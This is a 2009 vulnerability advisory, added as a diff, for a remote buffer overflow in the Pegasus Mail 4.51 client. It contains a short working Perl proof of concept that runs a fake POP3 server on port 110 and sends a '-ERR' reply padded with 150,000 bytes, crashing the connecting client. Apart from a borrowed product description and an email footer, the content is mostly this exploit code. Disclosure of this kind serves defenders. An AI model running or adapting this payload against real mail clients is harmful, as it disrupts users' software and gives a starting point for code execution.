@@ -1,0 +1,81 @@
+#####################################################################################
+
+Application:  Pegasus Mail Client
+            
+Platforms:    Windows XP Professional SP2
+
+Exploitation: remote BoF
+
+Date:         2009-10-06
+
+Author:       Francis Provencher (Protek Research Lab's) 
+	
+             
+
+#####################################################################################
+
+1) Introduction
+2) Technical details
+3) The Code (Only DoS)
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+Pegasus Mail (PMail) is suitable for single or multiple users on stand-alone computers and for internal and Internet mail on local area networks. Pegasus Mail has minimal system requirements compared with competing products, for instance the installed program (excluding mailboxes) for version 4.51 requires only around 13.5 MB of hard drive space. Since Pegasus Mail does not make changes to the Windows registry or the system directory, it is suitable as a portable application for USB drives. Language packs are available for languages other than English.
+
+Some commentators have described Pegasus Mail as convoluted and cumbersome to configure, whereas others value Pegasus Mail for the features it offers. A key feature of Pegasus Mail is that it does not use the HTML layout engine that is installed with every Microsoft operating system since 1997: The ubiquity of the Microsoft engine, which is used not only by all Microsoft products but by numerous 3rd party products as well, makes it a frequent target of malware such as Melissa and ILOVEYOU. Mail clients such as Pegasus Mail that have their own HTML rendering engine are inherently immune to these security exploits. Pegasus Mail will also not execute automation commands (for example ActiveX or JavaScript) embedded in an e-mail, further reducing the chances of a security breach.
+
+
+(from Wikipedia website)
+#####################################################################################
+
+============================
+2) Technical details 
+============================
+
+Pegasus Mail 4.51.(win32)
+Jun 23 2009 (Last Build)
+
+
+#####################################################################################
+
+===========
+3) The Code
+===========
+
+Proof of concept DoS code;
+
+
+#!/usr/bin/perl
+
+use IO::Socket;
+
+$port = 110;
+
+$serv = IO::Socket::INET->new(Proto=>'tcp',
+                              LocalPort=>$port,
+                              Listen=>1)
+or die "Error: listen($port)\n";
+
+$cli = $serv->accept() or die "Error: accept()\n";
+
+$junk    = "A" x 150000;
+
+$payload = "-ERR " . $junk . "\r\n"; # 
+
+     $cli->send($payload);
+
+     close($cli);
+     close($serv);
+
+
+#####################################################################################
+(PRL-2009-12)
+
+
+      __________________________________________________________________
+Make your browsing faster, safer, and easier with the new Internet Explorer&#65533; 8. Optimized for Yahoo! Get it Now for Free! at http://downloads.yahoo.com/ca/internetexplorer/
